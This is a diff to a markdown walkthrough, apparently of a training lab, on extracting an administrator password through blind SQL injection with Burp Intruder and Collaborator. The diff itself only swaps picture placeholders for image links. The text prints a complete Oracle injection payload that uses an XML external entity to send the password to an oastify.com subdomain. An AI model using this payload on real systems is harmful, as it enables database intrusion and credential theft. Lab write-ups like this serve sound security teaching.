@@ -39,19 +39,23 @@ only when a tested password character matches:
 The first test checks a character different from `a`. An interaction is
 observed when the condition is satisfied.
 
-**Pic 1**
+<img width="424" height="270" alt="1" src="https://github.com/user-attachments/assets/8fba6894-b1b0-4729-8793-996d51e603d4" />
 
-**Pic 2**
+
+<img width="876" height="120" alt="2" src="https://github.com/user-attachments/assets/21bfde3a-173c-40c8-8d5e-98cc1ae87c87" />
+
 
 The request is sent to Intruder with two payload positions: one for the
 character being tested and another for the subdomain. The attack type is
 set to `Battering Ram`.
 
-**Pic 3**
+<img width="1017" height="493" alt="3" src="https://github.com/user-attachments/assets/e308ec88-476b-4467-ac93-625af980cad9" />
+
 
 The Collaborator interaction reveals that the tested character is `e`.
 
-**Pic 4**
+<img width="824" height="109" alt="4" src="https://github.com/user-attachments/assets/90d7ad41-47d7-4391-8b63-ad49c1ec1fc7" />
+
 
 Repeating the process character by character results in the
 administrator password:
@@ -65,4 +69,5 @@ output into the Collaborator subdomain:
 
     mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 
-**Pic 5**
+<img width="738" height="122" alt="5" src="https://github.com/user-attachments/assets/1216a8eb-3b59-4c66-9042-976e556e47fd" />
+
